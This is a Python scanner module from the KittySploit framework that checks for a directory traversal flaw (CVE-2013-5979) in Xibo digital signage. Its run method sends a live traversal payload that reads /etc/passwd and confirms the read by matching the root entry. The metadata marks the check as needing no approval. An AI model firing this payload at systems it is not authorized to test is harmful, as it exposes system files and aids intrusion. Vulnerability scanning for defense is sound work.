#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in Spring Signage Xibo 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Xibo 1.2.2/1.4.1 - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in Spring Signage Xibo 1.2.x before 1.2.3 and 1.4.x before 1.4.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the p parameter to index.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2013', 'lfi', 'edb', 'springsignage', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/26955',
            'https://nvd.nist.gov/vuln/detail/CVE-2013-5979',
            'https://bugs.launchpad.net/xibo/+bug/1093967',
            'http://www.baesystemsdetica.com.au/Research/Advisories/Xibo-Directory-Traversal-Vulnerability-(DS-2013-00',
            'http://www.baesystemsdetica.com.au/Research/Advisories/Xibo-Directory-Traversal-Vulnerability-%28DS-2013-00',
        ],
        'cve': 'CVE-2013-5979',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?p=../../../../../../../../../../../../../../../../etc/passwd%00index&q=About&ajax=true&_=1355714673828', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Xibo 1.2.2/1.4.1 - Directory Traversal detected",
                path='/index.php?p=../../../../../../../../../../../../../../../../etc/passwd%00index&q=About&ajax=true&_=1355714673828',
            )
            return True
        return False

